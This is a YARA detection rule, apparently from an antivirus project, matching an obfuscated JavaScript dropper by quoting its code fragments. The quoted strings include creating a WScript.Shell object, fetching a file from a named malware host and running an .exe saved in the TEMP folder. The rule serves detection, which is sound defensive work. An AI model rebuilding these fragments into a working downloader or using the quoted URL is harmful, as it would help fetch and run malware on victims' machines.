rule sig_20160330_20e8f5b6a8257e2631eb902a749efd0f {
  meta:
    description = "datamaliciousorder - file 20160330_20e8f5b6a8257e2631eb902a749efd0f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "bfd98465f5ea3b906dd5fd04f78d576895652bb1c6923d8672f801fb45392bed"

  strings:
    $s1  = "var _QG = function _C() {return WScript[_TY](\"WScript\"+\".Shell\");}(), _BU = 11;" fullword ascii
    $s2  = "function _I(_I1, _E0){_Q = _Q * 1; return _I1 - _E0;};" fullword ascii
    $s3  = "_E[_WT](\"GET\", \"http://zakazdetali.kz/v7bsad\", false);" fullword ascii
    $s4  = "if (_E[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _YY(){return _D0 + \"\";};" fullword ascii
    $s6  = "function _XR() {return _QG[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"NQPgJGzpwou.ex\" + \"e\";};" fullword ascii
    $s7  = "function _C0(_S1){_QG[\"Run\"](_S1, _Q, _Q);};" fullword ascii
    $s8  = "function _FF() {return ((_Z == true) && (_Z == _SK)) ? 1 : _Q;};" fullword ascii
    $s9  = "function _SD(_CK) {var _SO = (1, 2, 3, 4, 5, _CK); return _SO;};" fullword ascii
    $s10 = "var _DR = new this[\"Date\"]();" fullword ascii
    $s11 = "function _VK(){return _TY;};" fullword ascii
    $s12 = "function _U()" fullword ascii
    $s13 = "return _I(_O, _D1);" fullword ascii
    $s14 = " while (_I0){" fullword ascii
    $s15 = "var _SK = false;" fullword ascii
    $s16 = "_Z = true; " fullword ascii
    $s17 = "var _Z = false;" fullword ascii
    $s18 = "var _KO = false;" fullword ascii
    $s19 = "_SK = true; " fullword ascii
    $s20 = "} catch(_EI){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}